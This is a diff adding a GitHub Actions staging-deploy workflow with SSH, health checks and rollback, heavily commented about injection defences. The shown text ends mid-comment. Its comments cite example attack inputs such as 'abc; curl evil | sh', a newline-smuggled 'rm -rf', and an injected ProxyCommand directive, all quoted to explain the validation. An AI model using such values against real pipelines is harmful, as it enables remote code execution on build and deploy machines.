@@ -1,0 +1,1188 @@
+# Staging deployment.
+#
+# Deploys, to the staging host, the image tag that CI built for `main`, runs a
+# post-deploy health check ON THE HOST, and automatically rolls back to the
+# previously deployed tag if that health check fails. Also serves as the manual
+# re-deploy / rollback entry point via workflow_dispatch.
+#
+# ---------------------------------------------------------------------
+# REQUIRED USER ACTION: create the "staging" GitHub Environment
+# ---------------------------------------------------------------------
+# The job declares `environment: staging`, which does not exist yet, and GitHub
+# auto-creates a referenced environment with NO rules - so until you configure
+# it, the gate protects nothing. In Settings > Environments, create "staging":
+#   * Required reviewers  - a human approves every staging deploy.
+#   * Deployment branches - restrict to the deploy branch (`main` only).
+#   * Move these secrets from REPOSITORY to ENVIRONMENT scope:
+#       STAGING_SSH_PRIVATE_KEY, STAGING_HOST, STAGING_USER, STAGING_KNOWN_HOSTS
+# WHY: repository-scoped secrets reach a workflow run on ANY branch, so without
+# the gate a collaborator with push access to any branch could edit this
+# workflow there, dispatch it, and print the deploy key. The gate only closes
+# that hole once the secrets are environment-scoped AND the branch policy is set.
+#
+# WHY THE HEALTH CHECK RUNS ON THE HOST (over SSH), NOT ON THE RUNNER:
+#   the staging middleware and backend bind to loopback on the staging host
+#   (backend 127.0.0.1:18080, frontend :8081 by default), so the runner cannot
+#   reach them. `docker/health-check.sh` executes on the host and needs `curl`
+#   there. Its exit contract is honoured rather than flattened:
+#     0 healthy | 1 unhealthy (roll back) | 2 configuration error ON THE HOST
+#   (no curl, bad tuning value, a probe URL that disagrees with the port). A 2
+#   is NOT a bad deploy, and rolling a healthy stack back for it would destroy a
+#   working deployment - so config errors deliberately do not roll back.
+#
+# HOW VALUES REACH THE HOST (the command-injection model):
+#   `ssh host cmd a b c` does not exec argv remotely: ssh joins its arguments
+#   into ONE string handed to the remote LOGIN SHELL, which re-parses it. A
+#   value containing ';', '$( )', a space or a newline therefore becomes remote
+#   shell syntax. This workflow relies on two things rather than on quoting:
+#     1. every value that reaches a remote command line must first match a
+#        strict allowlist, which admits no metacharacter, no space, no newline:
+#          deploy dir  ^/[A-Za-z0-9._/-]+$    image tag  ^[0-9a-f]{40}$
+#          env file    bare name [A-Za-z0-9._-], no '/' and no '..'
+#          probe URL   ^https?://[A-Za-z0-9._:/-]+$
+#          ssh port    digits only, no leading zero, 1-65535
+#        The three values that go into ~/.ssh/config follow the same model, but
+#        the hazard there is a different one: a config file is not a shell, so a
+#        newline in a value does not end a word - it starts a NEW DIRECTIVE.
+#        STAGING_SSH_PORT is therefore validated before the heredoc is written,
+#        and STAGING_HOST / STAGING_USER refuse a line break and leading or
+#        trailing whitespace (they are pasted in too). The directive that makes
+#        this the higher-value path is ProxyCommand: it needs NO
+#        PermitLocalCommand, it ignores BatchMode, and it fires on EVERY later
+#        ssh/scp call - i.e. on the runner, which is the machine holding the
+#        deploy key.
+#     2. that check is NEWLINE-SAFE: `case` globs, not
+#        `printf '%s' "$v" | grep -Eq '^...$'`. `grep -q` matches when ANY line
+#        matches, so the old idiom accepted $'aaaa...\nrm -rf /tmp/x' as a valid
+#        40-character SHA; a glob cannot match a newline unless the pattern
+#        names one, so a multi-line value always lands in the reject arm.
+#   The same allowlist is re-applied ON THE HOST by the shipped library, so a
+#   stale runner-side check cannot widen what the host accepts.
+#
+# SECRETS (Settings > Secrets and variables > Actions; move the first four to
+# environment scope - see above):
+#   STAGING_SSH_PRIVATE_KEY  private key of the deploy user on the staging host.
+#   STAGING_HOST             staging host name or IP.
+#   STAGING_USER             SSH user there; must be able to run `docker` and
+#                            must own the deploy directory.
+#   STAGING_KNOWN_HOSTS      OPTIONAL but recommended: the host's `known_hosts`
+#                            line. Without it the workflow falls back to
+#                            StrictHostKeyChecking=accept-new (trust on first
+#                            use) - see the Configure SSH step for the trade-off.
+#   GHCR_READ_TOKEN          OPTIONAL, and NOT needed today: the
+#                            ghcr.io/niuyeyeplus/roomflow-{backend,frontend}
+#                            packages are PUBLIC (verified by an anonymous
+#                            manifest GET returning HTTP 200), so the host pulls
+#                            them with no credential. Set it only if they are
+#                            ever made private; the login then stores a
+#                            credential on the host (see the note at the bottom).
+#
+# VARIABLES (same screen, "Variables" tab - non-secret):
+#   STAGING_DEPLOY_DIR  deploy dir on the host (default /opt/roomflow/staging).
+#   STAGING_SSH_PORT    SSH port (default 22). Validated before it is written
+#                       into ~/.ssh/config: digits only, no leading zero, and
+#                       1-65535. An invalid value fails the run here, with a
+#                       message that says which rule it broke, instead of
+#                       surfacing later as ssh's "Bad port 'abc'".
+#   STAGING_ENV_FILE    env-file NAME inside the deploy dir, not a path. Unset =
+#                       auto-detect `.env.staging` FIRST (the name every other
+#                       staging artifact documents: the compose header,
+#                       .env.staging.example, docker/README.md,
+#                       docs/deployment.md), then `.env`. When set, the named
+#                       file is used as given - never silently falling back, so
+#                       a typo is reported instead of papered over.
+#   STAGING_BACKEND_URL / STAGING_FRONTEND_URL
+#                       OPTIONAL probe-URL overrides. Unset (the default) =
+#                       derived on the host from STAGING_BACKEND_PORT /
+#                       STAGING_FRONTEND_PORT in the env file, falling back to
+#                       18080 / 8081. Setting one that NAMES a different port
+#                       than the env file is a hard error, not a silent
+#                       surprise; an override with no port of its own (a public
+#                       https URL in front of the loopback-bound stack) is not.
+#   GHCR_USER           OPTIONAL GHCR username for the login above.
+#
+# HOST PREREQUISITES (not created by this workflow):
+#   * An env file in the deploy dir - `.env.staging` or `.env` (see
+#     STAGING_ENV_FILE) - holding a value for every variable the staging compose
+#     guards with ${VAR:?}: DB_PASSWORD, MYSQL_ROOT_PASSWORD, REDIS_PASSWORD,
+#     RABBITMQ_USERNAME, RABBITMQ_PASSWORD, JWT_SECRET, ADMIN_PASSWORD_HASH,
+#     CORS_ALLOWED_ORIGINS. That list is READ FROM THE COMPOSE FILE, so it stays
+#     correct if the stack changes. `export VAR=value` is accepted; a value whose
+#     unescaped '$' Compose would re-interpolate is rejected with an explanation,
+#     EXCEPT a BCrypt-shaped hash - the value the operator's own generator prints
+#     - which is warned about and allowed through, because failing it would block
+#     the one value this stack needs (see .github/scripts/staging-deploy-lib.sh;
+#     write it single-quoted to make its meaning certain). The file is
+#     operator-owned:
+#     this workflow never creates or overwrites it and fails fast with an
+#     actionable error if it is missing or has empty required values.
+#   * curl, docker with the compose v2 plugin, and sshd.
+#   * Network access from the host to ghcr.io.
+#
+# NOTE ON THE (CONDITIONAL) `docker login` CREDENTIAL: it runs only when
+# GHCR_READ_TOKEN is set, because the packages are public - so the default path
+# writes nothing to the host. When it does run, the credential lands in the
+# host's docker config in base64, not encrypted: revoke the PAT if the host is
+# ever decommissioned.
+
+name: Deploy Staging
+
+on:
+  # Deploy only after the CI workflow that BUILDS AND PUSHES the images has
+  # finished successfully. Deploying first would race the image push.
+  workflow_run:
+    workflows: [CI]
+    types: [completed]
+    branches: [main]
+  # Manual re-deploy. Doubles as the ROLLBACK entry point: pass an older,
+  # known-good commit SHA in `image_tag`.
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: >-
+          Commit SHA to deploy. Leave empty to deploy the current head of the
+          dispatched branch. Set this to an older known-good SHA to roll back.
+        required: false
+        default: ''
+        type: string
+
+# Minimal: this workflow only reads the repository. GHCR access happens on the
+# staging host and uses no GitHub credential by default, so no `packages:`
+# scope is requested - least privilege.
+permissions:
+  contents: read
+
+# Serialise staging deploys: two merges into main must not interleave their
+# `compose up` / health-check / rollback sequences. cancel-in-progress is false
+# on purpose - cancelling a deploy midway (possibly between `up -d` and the
+# health check) would leave the host in an unknown state.
+concurrency:
+  group: deploy-staging
+  cancel-in-progress: false
+
+jobs:
+  deploy-staging:
+    runs-on: ubuntu-latest
+    # Gate the whole job behind the environment so the deploy key is only
+    # reachable by an approved run on an allowed branch. See the header.
+    environment: staging
+    # Backstop only. EVERY step below also carries its own timeout, so the
+    # worst case is bounded and known:
+    #   setup (resolve 2 + checkout 2 + verify 2 + validate 2 + ssh 2 +
+    #   previous-tag 2 + ship 3) = 15, ghcr login 2, deploy 10, health 8,
+    #   rollback 10, diagnostics 5, report 2  = 52 minutes in total.
+    # The job timeout is therefore 55 minutes, i.e. strictly greater than the
+    # sum of every step timeout, so the job timeout can never fire while the
+    # rollback step is still running - which is exactly the failure the old
+    # 35-minute value (against 33 minutes of steps plus umbrella-less setup
+    # steps that could each burn the 6-hour default) could produce: a cancelled
+    # job with the in-flight rollback killed halfway through.
+    timeout-minutes: 55
+    # Only deploy when CI succeeded for main. `branches: [main]` on the trigger
+    # already filters the branch; the head_branch check is belt-and-braces so a
+    # mis-configured trigger can never deploy a non-main commit.
+    if: >-
+      github.event_name == 'workflow_dispatch' ||
+      (github.event.workflow_run.conclusion == 'success' &&
+       github.event.workflow_run.head_branch == 'main')
+    env:
+      STAGING_DEPLOY_DIR: ${{ vars.STAGING_DEPLOY_DIR || '/opt/roomflow/staging' }}
+      # Empty = auto-detect on the host: .env.staging first, then .env.
+      STAGING_ENV_FILE: ${{ vars.STAGING_ENV_FILE || '' }}
+      # Empty = derive the probe URL on the host from the env file's
+      # STAGING_BACKEND_PORT / STAGING_FRONTEND_PORT (falling back to
+      # 18080 / 8081). See .github/scripts/staging-deploy-lib.sh: the port is a
+      # setting the template advertises, so hardcoding it here would probe the
+      # wrong port and roll back a perfectly healthy deploy.
+      STAGING_BACKEND_URL: ${{ vars.STAGING_BACKEND_URL || '' }}
+      STAGING_FRONTEND_URL: ${{ vars.STAGING_FRONTEND_URL || '' }}
+    steps:
+      # ---------------------------------------------------------------------
+      # 1. Resolve the image tag. This runs BEFORE checkout because checkout
+      #    must be pinned to the deployed revision (see the checkout step).
+      # ---------------------------------------------------------------------
+      - name: Resolve and validate the image tag
+        id: resolve-tag
+        timeout-minutes: 2
+        env:
+          # CRITICAL: github.sha must NOT be used for the workflow_run path.
+          # Under `workflow_run`, github.sha is the DEFAULT BRANCH HEAD AT
+          # TRIGGER TIME (or the head of the last push to a branch of this
+          # repo), NOT the commit CI just built. It advances as soon as anyone
+          # merges, so using it here would silently deploy a commit that CI
+          # never built - and, worse, one that may not have been reviewed.
+          # The commit CI built is github.event.workflow_run.head_sha.
+          EVENT_NAME: ${{ github.event_name }}
+          WORKFLOW_RUN_HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
+          DISPATCH_IMAGE_TAG: ${{ inputs.image_tag }}
+          # For workflow_dispatch the run is against the dispatched ref, so this
+          # is the current main SHA when dispatched from the default branch.
+          DISPATCH_SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+
+          if [ "${EVENT_NAME}" = "workflow_run" ]; then
+            RAW_TAG="${WORKFLOW_RUN_HEAD_SHA}"
+            SOURCE="workflow_run.head_sha (the commit CI built and pushed)"
+          else
+            RAW_TAG="${DISPATCH_IMAGE_TAG}"
+            SOURCE="workflow_dispatch input image_tag"
+            if [ -z "${RAW_TAG}" ]; then
+              RAW_TAG="${DISPATCH_SHA}"
+              SOURCE="workflow_dispatch default (github.sha; dispatch from main)"
+            fi
+          fi
+
+          # GATE 1 - command-injection guard: the tag reaches the remote command
+          # line as an argument to `bash -s`, so `abc; curl evil | sh` would be
+          # an injection vector. Accept only a lowercase hex commit SHA prefix.
+          #
+          # `case`, not `grep`: `| grep -Eq '^[0-9a-f]{7,40}$'` matched if ANY
+          # line matched, so a multi-line payload passed this gate (see the
+          # header). The rule is inline rather than sourced from the shared
+          # library because that library is not on disk until AFTER checkout,
+          # and the checkout ref must already be this validated value.
+          case "${RAW_TAG}" in
+            '' | *[!0-9a-f]*)
+              echo "::error::Invalid image_tag (length ${#RAW_TAG}). It must match ^[0-9a-f]{7,40}$ - a hex commit SHA. Refusing to build a shell command from it."
+              exit 1
+              ;;
+          esac
+          if [ "${#RAW_TAG}" -lt 7 ] || [ "${#RAW_TAG}" -gt 40 ]; then
+            echo "::error::Invalid image_tag (length ${#RAW_TAG}). It must match ^[0-9a-f]{7,40}$ - a hex commit SHA. Refusing to build a shell command from it."
+            exit 1
+          fi
+
+          # GATE 2 - immutability and usability. CI publishes the FULL 40-char
+          # SHA (docker/metadata-action type=raw,value=<github.sha>), and a full
+          # SHA is what makes the deploy immutable and fetchable. A short prefix
+          # cannot be checked out by git or pulled from the registry, so reject
+          # it here with a clear message instead of failing later with a
+          # confusing "manifest unknown" / "couldn't find remote ref".
+          if [ "${#RAW_TAG}" -ne 40 ]; then
+            echo "::error::image_tag must be the full 40-character commit SHA (got ${#RAW_TAG} characters). Note that we never shorten the tag: the full SHA is what makes the deploy immutable."
+            exit 1
+          fi
+
+          # SAFE: GATE 1 + GATE 2 together have proven RAW_TAG is exactly 40
+          # lowercase hex characters, so it cannot contain a newline. Writing an
+          # unvalidated value to $GITHUB_OUTPUT would be an injection vector in
+          # its own right - a value containing "\nother=value" appends a SECOND
+          # output key - which is why the validation above is a precondition of
+          # this write and not merely a later sanity check.
+          echo "tag=${RAW_TAG}" >> "$GITHUB_OUTPUT"
+          echo "source=${SOURCE}" >> "$GITHUB_OUTPUT"
+          # Deliberately NOT masked with ::add-mask::: a commit SHA is public
+          # information and masking it would replace it with *** everywhere,
+          # including in the job summary that operators rely on.
+          echo "Resolved image tag: ${RAW_TAG} (${SOURCE})"
+
+      # ---------------------------------------------------------------------
+      # 2. Check out the revision being deployed, so the compose file, the
+      #    health-check script and the shared library shipped to the host always
+      #    match the images. Under workflow_run the default checkout is the
+      #    default branch HEAD, which may be NEWER than the deployed SHA - hence
+      #    the explicit ref.
+      # ---------------------------------------------------------------------
+      - uses: actions/checkout@v4
+        # Every step carries a timeout: the job-timeout budget in the
+        # `deploy-staging` job comment is only a real bound if no step can run
+        # until the job timeout instead of its own.
+        timeout-minutes: 2
+        with:
+          ref: ${{ steps.resolve-tag.outputs.tag }}
+
+      - name: Verify the deploy artifacts exist in this revision
+        timeout-minutes: 2
+        env:
+          IMAGE_TAG: ${{ steps.resolve-tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+          missing=0
+          for f in docker/docker-compose.staging.yml docker/health-check.sh .github/scripts/staging-deploy-lib.sh; do
+            if [ ! -f "${f}" ]; then
+              echo "::error::Required deploy artifact '${f}' is missing from revision ${IMAGE_TAG}."
+              missing=1
+            fi
+          done
+          if [ "${missing}" -ne 0 ]; then
+            echo "::error::Cannot deploy: the staging compose file, the health-check script and the shared deploy library must all exist in the deployed revision."
+            exit 1
+          fi
+
+      # ---------------------------------------------------------------------
+      # 3. Validate every value that will reach a remote command line, ONCE,
+      #    before any of them is used. The rules come from the shipped library
+      #    so the runner and the host cannot drift apart.
+      # ---------------------------------------------------------------------
+      - name: Validate deployment configuration
+        timeout-minutes: 2
+        run: |
+          set -euo pipefail
+
+          # shellcheck source=/dev/null
+          . .github/scripts/staging-deploy-lib.sh
+
+          # Each of these values is passed to `ssh` as an argument, and ssh
+          # joins its argv into one string for the remote login shell to
+          # re-parse (see the header). The allowlists below are what make that
+          # safe: they admit no shell metacharacter, no space and no newline.
+          if ! validate_deploy_dir "${STAGING_DEPLOY_DIR}"; then
+            echo "::error::STAGING_DEPLOY_DIR must be an absolute path matching ^/[A-Za-z0-9._/-]+$ (length ${#STAGING_DEPLOY_DIR}). Refusing to build a shell command from it."
+            exit 1
+          fi
+          if ! validate_env_override "${STAGING_ENV_FILE}"; then
+            echo "::error::STAGING_ENV_FILE must be a bare file name inside the deploy dir - a name like .env.staging, with no '/', no '..' and no shell metacharacters (length ${#STAGING_ENV_FILE})."
+            exit 1
+          fi
+          if [ -n "${STAGING_BACKEND_URL}" ] && ! validate_probe_url "${STAGING_BACKEND_URL}"; then
+            echo "::error::STAGING_BACKEND_URL must be a plain http(s) URL matching ^https?://[A-Za-z0-9._:/-]+$ (length ${#STAGING_BACKEND_URL})."
+            exit 1
+          fi
+          if [ -n "${STAGING_FRONTEND_URL}" ] && ! validate_probe_url "${STAGING_FRONTEND_URL}"; then
+            echo "::error::STAGING_FRONTEND_URL must be a plain http(s) URL matching ^https?://[A-Za-z0-9._:/-]+$ (length ${#STAGING_FRONTEND_URL})."
+            exit 1
+          fi
+
+          echo "Deployment configuration validated: deploy dir, env-file override and probe URLs."
+
+      - name: Configure SSH for the staging host
+        timeout-minutes: 2
+        env:
+          SSH_PRIVATE_KEY: ${{ secrets.STAGING_SSH_PRIVATE_KEY }}
+          STAGING_HOST: ${{ secrets.STAGING_HOST }}
+          STAGING_USER: ${{ secrets.STAGING_USER }}
+          STAGING_KNOWN_HOSTS: ${{ secrets.STAGING_KNOWN_HOSTS }}
+          SSH_PORT: ${{ vars.STAGING_SSH_PORT || '22' }}
+        run: |
+          # NOTE: never add `set -x` here - this step handles the deploy key.
+          set -euo pipefail
+
+          if [ -z "${SSH_PRIVATE_KEY}" ]; then
+            echo "::error::Secret STAGING_SSH_PRIVATE_KEY is empty; cannot authenticate to the staging host."
+            exit 1
+          fi
+          if [ -z "${STAGING_HOST}" ] || [ -z "${STAGING_USER}" ]; then
+            echo "::error::Secrets STAGING_HOST and STAGING_USER must both be set."
+            exit 1
+          fi
+
+          # -------------------------------------------------------------------
+          # Every value below is interpolated into ~/.ssh/config, which is a
+          # CONFIG FILE, not a shell: a newline inside a value does not end a
+          # word, it starts a NEW DIRECTIVE. So `22\n  ProxyCommand sh -c '...'`
+          # is not a (rejected) port, it is a port plus a directive - and
+          # ProxyCommand is the one that matters, because it needs no
+          # PermitLocalCommand, it ignores BatchMode, and it runs on the runner
+          # (the machine holding the deploy key) on EVERY later ssh/scp call.
+          # The checks are here, BEFORE anything is written, so a rejected value
+          # cannot leave a usable config behind. Every other value in this
+          # workflow already matches a rule before it is used (see the header);
+          # these three did not.
+          #
+          # Why the rules are inline rather than sourced from the shared library:
+          # nothing on this list is ever sent to the host, so there is no
+          # runner/host drift to prevent.
+          #
+          # Quoting the values inside the heredoc is NOT a control and is
+          # deliberately not relied on: ssh_config has no continuation syntax, so
+          # the newline still ends the directive line, and quoting only helps if
+          # EVERY interpolated value is quoted (a version-dependent parser
+          # behaviour, not a documented guarantee). Once these checks have run,
+          # no interpolated value can contain a newline, so quoting would add
+          # nothing to protect against.
+          case "${SSH_PORT}" in
+            '')
+              # Defense in depth: this arm is unreachable as the workflow
+              # stands. An empty string is falsy in a GitHub expression, so
+              # `vars.STAGING_SSH_PORT || '22'` collapses a set-but-empty
+              # variable to '22' exactly as it does an unset one - emptiness
+              # cannot reach here.
+              #
+              # It stays because it is the only guard against an empty port if
+              # that `||` default is ever dropped from `env:`, or if the value
+              # is ever supplied some other way. An empty Port line is refused
+              # by ssh with a bare "Bad port", so naming the failure explicitly
+              # is worth keeping.
+              echo "::error::STAGING_SSH_PORT is set to an empty value. Set it to a TCP port number (1-65535), or unset the variable to use the default 22."
+              exit 1
+              ;;
+            *[!0-9]*)
+              # No value is echoed: this arm is where a newline payload lands and
+              # printing it would let that payload inject a workflow command into
+              # the log - the same reason the previous-tag step strips CR/LF.
+              echo "::error::STAGING_SSH_PORT must be digits only - a TCP port number (length ${#SSH_PORT}). Refusing to write it into ~/.ssh/config."
+              exit 1
+              ;;
+          esac
+          if [ "${#SSH_PORT}" -gt 5 ]; then
+            echo "::error::STAGING_SSH_PORT is ${#SSH_PORT} digits long; a TCP port has at most 5 (1-65535)."
+            exit 1
+          fi
+          # A leading zero is refused rather than normalised, and this check must
+          # stay BEFORE the range test below: `[ 08080 -lt 1 ]` is not a decimal
+          # comparison (it returns false), so a leading-zero port would slip
+          # through the range test as written, and Compose/docker need not agree
+          # with ssh about what `08080` publishes in any case. '0' alone does not
+          # match this glob and falls through to the range test, which refuses it.
+          case "${SSH_PORT}" in
+            0[0-9]*)
+              echo "::error::STAGING_SSH_PORT=${SSH_PORT} has a leading zero. Write it as a plain decimal port (08080 -> 8080) so the port ssh uses cannot differ from the one an operator reads."
+              exit 1
+              ;;
+          esac
+          if [ "${SSH_PORT}" -lt 1 ] || [ "${SSH_PORT}" -gt 65535 ]; then
+            echo "::error::STAGING_SSH_PORT=${SSH_PORT} is outside the valid TCP port range 1-65535."
+            exit 1
+          fi
+
+          # STAGING_HOST / STAGING_USER are pasted into the same heredoc without a
+          # rule of their own, so a malformed paste with a line break would inject
+          # a directive exactly as a malicious port would. They are secrets
+          # (admin-controlled, hence the lower severity), and a strict allowlist
+          # here could reject a legitimate value - an IPv6 literal, a
+          # 'user@host'-style name - so only what can NEVER be legitimate is
+          # refused: a line break anywhere in the value, and leading or trailing
+          # whitespace (both of which are invisible in the GitHub UI and would be
+          # pasted in silently). Neither message echoes the value.
+          case "${STAGING_HOST}" in
+            *$'\n'* | *$'\r'*)
+              echo "::error::Secret STAGING_HOST contains a line break, which would start a new directive in ~/.ssh/config. Re-set the secret to a single-line host name or IP address."
+              exit 1
+              ;;
+            [[:space:]]* | *[[:space:]])
+              echo "::error::Secret STAGING_HOST has leading or trailing whitespace (invisible in the GitHub UI). Remove it and re-set the secret."
+              exit 1
+              ;;
+          esac
+          case "${STAGING_USER}" in
+            *$'\n'* | *$'\r'*)
+              echo "::error::Secret STAGING_USER contains a line break, which would start a new directive in ~/.ssh/config. Re-set the secret to a single-line user name."
+              exit 1
+              ;;
+            [[:space:]]* | *[[:space:]])
+              echo "::error::Secret STAGING_USER has leading or trailing whitespace (invisible in the GitHub UI). Remove it and re-set the secret."
+              exit 1
+              ;;
+          esac
+
+          mkdir -p ~/.ssh
+          chmod 700 ~/.ssh
+
+          # Write the key from stdin (env-mapped, never echoed to the log).
+          # `install -m 600` creates the file already 0600, so the private key
+          # is never readable by anyone else, not even for an instant (a `>`
+          # redirect followed by `chmod` would leave that window open).
+          install -m 600 /dev/stdin ~/.ssh/roomflow_staging_deploy <<<"${SSH_PRIVATE_KEY}"
+          unset SSH_PRIVATE_KEY
+
+          # HOST KEY TRUST - trade-off:
+          #  * STAGING_KNOWN_HOSTS set -> StrictHostKeyChecking=yes, the host key
+          #    is pinned and a MITM/DNS hijack of the staging host fails loud.
+          #  * not set -> StrictHostKeyChecking=accept-new (trust on first use):
+          #    the key is recorded on first contact and mismatches fail later,
+          #    but the FIRST connection could be intercepted. Acceptable for a
+          #    bootstrap, not for a host reachable by untrusted networks - set
+          #    STAGING_KNOWN_HOSTS (contents of the host's `known_hosts` line,
+          #    e.g. from `ssh-keyscan staging.example.com`) to close that gap.
+          if [ -n "${STAGING_KNOWN_HOSTS}" ]; then
+            printf '%s\n' "${STAGING_KNOWN_HOSTS}" > ~/.ssh/known_hosts
+            STRICT_HOST_KEY_CHECKING="yes"
+          else
+            : > ~/.ssh/known_hosts
+            STRICT_HOST_KEY_CHECKING="accept-new"
+            echo "::warning::STAGING_KNOWN_HOSTS is not set; falling back to StrictHostKeyChecking=accept-new (trust on first use). Set the secret to pin the staging host key."
+          fi
+          chmod 600 ~/.ssh/known_hosts
+
+          # A single Host alias keeps every later ssh/scp call short and
+          # consistent. BatchMode disables interactive prompts (a prompt would
+          # otherwise hang until the job timeout).
+          # The heredoc is deliberately UNQUOTED (it must interpolate) and the
+          # only thing keeping the values in it from becoming directives of their
+          # own is the validation above - it is a precondition of this write, not
+          # a later sanity check. STRICT_HOST_KEY_CHECKING is a literal chosen by
+          # this script, never an operator value.
+          cat > ~/.ssh/config <<EOF
+          Host roomflow-staging
+            HostName ${STAGING_HOST}
+            User ${STAGING_USER}
+            Port ${SSH_PORT}
+            IdentityFile ~/.ssh/roomflow_staging_deploy
+            IdentitiesOnly yes
+            StrictHostKeyChecking ${STRICT_HOST_KEY_CHECKING}
+            UserKnownHostsFile ~/.ssh/known_hosts
+            BatchMode yes
+            ConnectTimeout 15
+            ServerAliveInterval 30
+          EOF
+          chmod 600 ~/.ssh/config
+
+      # ---------------------------------------------------------------------
+      # 4. Rollback target. MUST run before anything on the host is changed.
+      # ---------------------------------------------------------------------
+      - name: Capture the currently deployed tag (rollback target)
+        id: previous-tag
+        timeout-minutes: 2
+        run: |
+          set -euo pipefail
+
+          # Runs after checkout, so the shipped library is on disk and the tag
+          # rule is not spelled out a second time here.
+          # shellcheck source=/dev/null
+          . .github/scripts/staging-deploy-lib.sh
+
+          # `docker inspect` prints the image reference the running backend
+          # container was created from, e.g.
+          #   ghcr.io/niuyeyeplus/roomflow-backend:<sha>
+          # First deploy on a fresh host: no container exists, docker inspect
+          # fails, PREV_IMAGE is empty and we record "no rollback target".
+          PREV_IMAGE="$(ssh roomflow-staging "docker inspect --format '{{.Config.Image}}' roomflow-staging-backend 2>/dev/null" || true)"
+
+          # Strip CR/LF before this host-supplied string is echoed: a newline in
+          # it could otherwise smuggle a workflow command (e.g. `::error::`)
+          # into the log. Cheap, and it keeps the log a log.
+          PREV_IMAGE="${PREV_IMAGE//$'\r'/}"
+          PREV_IMAGE="${PREV_IMAGE//$'\n'/}"
+
+          PREV_TAG=""
+          case "${PREV_IMAGE}" in
+            # Digest-pinned container: there is no tag to go back to.
+            *@sha256:*) ;;
+            *:*) PREV_TAG="${PREV_IMAGE##*:}" ;;
+          esac
+
+          # Same newline-safe rule as the resolved tag: a value lifted from the
+          # host is still interpolated into a remote shell command, and `latest`
+          # is not an immutable rollback target anyway.
+          if [ -n "${PREV_TAG}" ] && ! validate_image_tag "${PREV_TAG}"; then
+            echo "::warning::Currently deployed tag '${PREV_TAG}' is not an immutable 40-char commit SHA; automatic rollback will not be attempted for this run."
+            PREV_TAG=""
+          fi
+
+          # SAFE: PREV_TAG is either empty or exactly 40 hex characters (proven
+          # above), so it cannot contain a newline and cannot append a second
+          # output key here.
+          echo "tag=${PREV_TAG}" >> "$GITHUB_OUTPUT"
+          if [ -n "${PREV_TAG}" ]; then
+            echo "Currently deployed image: ${PREV_IMAGE} -> rollback target ${PREV_TAG}"
+          else
+            echo "No previously deployed image found on the staging host (first deploy, or a non-SHA tag was in use). Automatic rollback is unavailable for this run."
+          fi
+
+      # ---------------------------------------------------------------------
+      # 5. Ship the compose file, the health-check script and the shared
+      #    library from the DEPLOYED revision, so the host never runs a stale
+      #    definition.
+      # ---------------------------------------------------------------------
+      - name: Ship deploy artifacts to the staging host
+        timeout-minutes: 3
+        run: |
+          set -euo pipefail
+
+          # STAGING_DEPLOY_DIR was proven to match ^/[A-Za-z0-9._/-]+$ by the
+          # "Validate deployment configuration" step; that, and not quoting, is
+          # what makes the unquoted `mkdir -p` argument safe after ssh re-parses
+          # it on the far side.
+          ssh roomflow-staging mkdir -p "${STAGING_DEPLOY_DIR}"
+          scp -q docker/docker-compose.staging.yml "roomflow-staging:${STAGING_DEPLOY_DIR}/docker-compose.staging.yml"
+          scp -q docker/health-check.sh "roomflow-staging:${STAGING_DEPLOY_DIR}/health-check.sh"
+          scp -q .github/scripts/staging-deploy-lib.sh "roomflow-staging:${STAGING_DEPLOY_DIR}/staging-deploy-lib.sh"
+          echo "Shipped docker-compose.staging.yml, health-check.sh and staging-deploy-lib.sh to ${STAGING_DEPLOY_DIR}."
+
+      # ---------------------------------------------------------------------
+      # 6. Registry auth on the host - ONLY when a credential exists.
+      #    The ghcr.io/niuyeyeplus/roomflow-* packages are PUBLIC (verified by
+      #    an anonymous manifest GET returning HTTP 200), so the default path
+      #    stores no credential on the host at all: an unconditional `docker
+      #    login` would write a base64 (NOT encrypted) credential into the
+      #    host's ~/.docker/config.json that grants nothing the host needs.
+      # ---------------------------------------------------------------------
+      - name: Log in to GHCR on the staging host (only when GHCR_READ_TOKEN is set)
+        timeout-minutes: 2
+        env:
+          GHCR_USER: ${{ vars.GHCR_USER || github.actor }}
+          GHCR_TOKEN: ${{ secrets.GHCR_READ_TOKEN }}
+        run: |
+          # NOTE: never add `set -x` here - this step handles a credential.
+          set -euo pipefail
+
+          if [ -z "${GHCR_TOKEN}" ]; then
+            echo "GHCR_READ_TOKEN is not set; skipping 'docker login'. The roomflow-* packages are public, so the host can pull them anonymously and nothing is written to the host's docker config."
+            exit 0
+          fi
+
+          # GHCR_USER is the one value that reaches a remote command line without
+          # an allowlist, so the single quotes around it are the ONLY thing
+          # stopping it from being remote shell syntax (the header's model: a
+          # value may only go near a remote command line once it matches a rule).
+          # Brackets such as `dependabot[bot]` are fine inside those quotes, but a
+          # single quote of its own would END the quoting and hand the rest of the
+          # value to the remote shell, and a newline would end the command. Reject
+          # exactly those two instead of trusting the quoting.
+          case "${GHCR_USER}" in
+            *"'"* | *$'\n'* | *$'\r'*)
+              echo "::error::GHCR_USER (or the github.actor fallback) contains a single quote or a line break, which cannot be passed safely to the remote 'docker login' command. Set the GHCR_USER repository variable to a plain GHCR username."
+              exit 1
+              ;;
+          esac
+
+          # `--password-stdin` keeps the token out of the remote command line,
+          # out of the host's `ps` output and out of this log.
+          printf '%s' "${GHCR_TOKEN}" | ssh roomflow-staging "docker login ghcr.io --username '${GHCR_USER}' --password-stdin"
+          echo "Logged in to ghcr.io on the staging host as ${GHCR_USER} (packages are expected to be private)."
+          echo "::warning::A GHCR credential is now stored on the staging host's docker config (base64, not encrypted). Revoke the PAT if the host is decommissioned."
+
+      # ---------------------------------------------------------------------
+      # 7. Deploy.
+      # ---------------------------------------------------------------------
+      - name: Deploy staging stack (docker compose up -d)
+        id: deploy
+        # A hung image pull / compose up must not eat the job timeout: fail the
+        # step so the health-check and rollback steps still get to run.
+        timeout-minutes: 10
+        env:
+          IMAGE_TAG: ${{ steps.resolve-tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+
+          # The remote script arrives over stdin (a quoted heredoc, so the
+          # runner expands nothing inside it) and values are passed positionally,
+          # each already proven on the runner and re-proven on the host. See the
+          # header for why an allowlisted argv is safe for ssh.
+          #
+          # STAGING_ENV_FILE goes as the shell literal '' when it is empty, like
+          # the health-check and rollback steps do: ssh joins argv into ONE string
+          # with single spaces and no quoting, so an EMPTY argument contributes
+          # nothing to that join and VANISHES, shifting every later positional one
+          # place left. That is harmless today only because the empty value is in
+          # TRAILING position - append any argument here later and the remote
